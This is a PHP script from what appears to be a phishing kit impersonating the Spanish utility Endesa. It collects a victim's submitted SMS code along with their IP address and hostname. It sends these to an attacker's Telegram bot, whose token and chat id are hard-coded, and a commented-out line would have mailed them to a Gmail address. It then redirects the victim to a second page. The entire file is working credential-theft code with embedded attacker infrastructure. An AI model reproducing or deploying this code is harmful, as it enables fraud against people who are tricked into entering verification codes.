 ﻿<?php
$send = "fouadset1224@gmail.com";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "==========|| SMS 2 ||===========\n";
$message .= "Tel�fono	: ".$_POST['sms']."\n";
$message .= "==================================\n";
$message .= "IP Address 		: ".$ip."\n";
$message .= "Host Name 		: ".$hostname."\n";
$message .= "===========|| By knk ||=======\n";

//$subject = "KINNEK[SMS] | ".$ip."\n";
//$headers = "From: pc.endesa<D7497383@onlinehome.de>";
//mail($send,$subject,$message,$headers);

$website="https://api.telegram.org/bot945808037:AAFJgmcIS38Xy8IPIQ5OAS3jputsX0b1PVM";
$chatId=-364934965;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-364934965',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo '<meta http-equiv="refresh" content="0; URL=index2.html">';

?>